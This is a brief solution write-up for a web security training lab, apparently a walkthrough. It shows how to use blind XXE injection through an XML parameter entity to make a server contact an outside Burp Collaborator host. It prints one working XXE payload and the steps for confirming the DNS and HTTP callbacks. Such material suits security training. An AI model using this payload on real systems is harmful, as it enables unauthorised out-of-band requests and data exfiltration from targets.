Lab 4 - Blind XXE with out-of-band interaction via XML parameter entities

Target Goal - Exploit blind XXE injection to issue a DNS lookup and HTTP request to Burp Collaborator.

Solution:

Insert the following external entity definition in between the XML declaration and the stockCheck element. 
Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>

Go to the Collaborator tab, and click "Poll now". 
If you don't see any interactions listed, wait a few seconds and try again. 
You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
